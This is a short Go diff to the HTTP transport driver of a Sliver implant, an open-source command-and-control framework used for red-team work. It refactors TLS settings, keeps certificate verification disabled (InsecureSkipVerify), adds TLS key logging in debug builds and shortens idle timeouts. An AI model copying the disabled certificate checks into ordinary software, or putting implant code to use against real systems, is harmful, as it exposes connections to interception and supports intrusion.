@@ -24,9 +24,11 @@ import (
 	"net/http"
 	"net/url"
 	"sync"
+	"time"
 
 	// {{if .Config.Debug}}
 	"log"
+	"github.com/bishopfox/sliver/implant/sliver/cryptography"
 	// {{end}}
 
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
@@ -35,19 +37,29 @@ import (
 // GoHTTPDriver - Pure Go HTTP driver
 func GoHTTPDriver(origin string, secure bool, opts *HTTPOptions) (HTTPDriver, error) {
 	var transport *http.Transport
+	tlsConfig := &tls.Config{
+		InsecureSkipVerify: true, // We don't care about the HTTP(S) layer certs
+	}
+	// {{if .Config.Debug}}
+	if cryptography.TLSKeyLogger != nil {
+		tlsConfig.KeyLogWriter = cryptography.TLSKeyLogger
+	}
+	// {{end}}
 	if !secure {
 		transport = &http.Transport{
+			IdleConnTimeout:     time.Millisecond,
 			Dial:                proxy.Direct.Dial,
 			TLSHandshakeTimeout: opts.TlsTimeout,
-			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
+			TLSClientConfig:     tlsConfig,
 		}
 	} else {
 		transport = &http.Transport{
+			IdleConnTimeout: time.Millisecond,
 			Dial: (&net.Dialer{
 				Timeout: opts.NetTimeout,
 			}).Dial,
 			TLSHandshakeTimeout: opts.TlsTimeout,
-			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
+			TLSClientConfig:     tlsConfig,
 		}
 	}
 	client := &http.Client{
